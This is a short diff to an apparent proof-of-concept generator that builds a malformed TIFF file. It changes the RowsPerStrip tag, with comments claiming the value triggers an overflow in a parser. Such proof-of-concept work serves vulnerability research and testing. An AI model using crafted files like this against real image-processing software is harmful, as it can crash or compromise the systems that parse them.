@@ -25,7 +25,7 @@ def build_poc():
         (262, 3, 1, 1),             # PhotometricInterpretation: BlackIsZero
         (273, 4, 1, 122),           # StripOffsets
         (277, 3, 1, 1),             # SamplesPerPixel: 1
-        (278, 4, 1, 0xFFFFFFFF),    # RowsPerStrip: Maximum 32-bit Integer! (Trigger overflow)
+        (278, 4, 1, 1),             # RowsPerStrip: 1 (tiny, triggers overflow if ImageLength=10)
         (279, 4, 1, len(zlib_payload)) # StripByteCounts
     ] 
     
